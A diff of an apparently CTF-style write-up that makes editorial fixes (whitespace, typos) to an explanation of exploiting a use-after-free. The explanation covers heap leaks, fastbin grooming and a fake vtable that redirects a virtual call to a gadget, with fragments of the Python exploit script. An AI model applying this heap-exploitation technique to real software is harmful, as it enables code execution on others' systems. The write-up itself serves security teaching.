@@ -101,11 +101,11 @@ When a virtual function gets called, it will get the vtable ptr from the object,
 ```asm
 mov     eax, [ebp+selectedGun]	; get vtable pointer
 mov     eax, [eax]				
-add     eax, 4					; add offset for Reload()
-mov     eax, [eax]				; get function pointer from there
+add     eax, 4			; add offset for Reload()
+mov     eax, [eax]		; get function pointer from there
 sub     esp, 0Ch
 push    [ebp+selectedGun]
-call    eax						; call Reload()
+call    eax			; call Reload()
 ```
 
 So, if we'd be able to overwrite the vtable pointer for a class, we could craft a function pointer array and let the vtable point to that one. When the application then tries to call one of the virtual functions, it would call our injected function instead.
@@ -137,7 +137,7 @@ int dropGun()
 }
 ``` 
 
-But this won't reset the `SelectedGun`, so we could have a gun selected, which just has been free'd. To make this even better, the `UseGun` method doesn't check the `gunInUse` array, if the currently selected gun is still allocated, so we have an use-after-free, just wating to get exploited.
+But this won't reset the `SelectedGun`, so we could have a gun selected, which just has been free'd. To make this even better, the `UseGun` method doesn't check the `gunInUse` array, to see if the currently selected gun is still allocated, so we have an use-after-free, just wating to get exploited.
 
 ```c
 int useGun()
@@ -163,9 +163,9 @@ int useGun()
 }
 ```
 
-This function gives us a possible leak with the name of the gun (which might be free'd and thus containing a heap pointer), and as soon as we'll be able to overwrite the vtable pointer, it will execute our payload.
+This function gives us a possible leak with the name of the gun (which might be free'd and thus containing a heap pointer), and as soon as we'll be able to overwrite the vtable pointer, it will also execute our payload.
 
-So let's first leak a heap address, which we'll need to calculate the address where our fake vtable will be stored. For this we'll create a *small* gun (fastbin size).
+So let's first leak a heap address, which we'll need to calculate the address, where our fake vtable will be stored. For this we'll create a *small* gun (fastbin size).
 
 ```python
 def exploit(r):
@@ -244,7 +244,7 @@ Now let's create a fake vtable, which contains something more useful (for us) th
 	buy(1, 32, payload)			# 0
 ```
 
-*HEAPDEST* will contain the address, where this vtable is stored on the heap (Name + 4 bytes). So, "all" we'll have to do, is to create a gun, which uses this vtable. Again the *use-after-ree* will help us with this.
+*HEAPDEST* will contain the address, where this vtable is stored on the heap (Name + 4 bytes). So, *all* we'll have to do, is to create a gun, which uses this vtable. Again the *use-after-free* will help us with this.
 
 The size of a gun class is 20 bytes. If we allocate 3 guns with a name 32 bytes long, each one will allocate 20 bytes for itself and 32 bytes for its name.
 
@@ -269,8 +269,8 @@ When we now free (drop) those guns, the gun classes will be put in fastbinsY[1],
 	payload += "EEEE"
 
 	buy(1, 32, payload)			# 0
-	buy(1, 32, "XXXXYYYY")		# 2
-	buy(1, 32, "EEEEFFFF")		# 3	
+	buy(1, 32, "XXXXYYYY")			# 2
+	buy(1, 32, "EEEEFFFF")			# 3	
 	
 	selectgun(2)
 	
@@ -280,13 +280,13 @@ When we now free (drop) those guns, the gun classes will be put in fastbinsY[1],
 ```
 
 ```c
-FastbinsY[1] : Gun 3  --> Gun 2  --> Gun 1
-FastbinsY[3] : Name 3 --> Name 2 --> Name 0
+fastbinsY[1] : Gun 3  --> Gun 2  --> Gun 1
+fastbinsY[3] : Name 3 --> Name 2 --> Name 0
 ```
 
 Now allocating a gun with a name only 16 bytes long, will result in malloc using the chunk *Gun3* to allocate the memory for the new gun, and chunk *Gun2* for the name of our new gun, since its size also matches that of fastbinsY[1].
 
-Thus creating this new gun will result in overwriting the class information of gun 2 with the name of our new gun and with it its precious vtable ptr. 
+Thus creating this new gun will result in overwriting the class information of gun 2 with the name of our new gun and with it, its precious vtable ptr. 
 
 With this we can overwrite it with the address of our previously created fake vtable, which contains the address of our magic gadget.
 
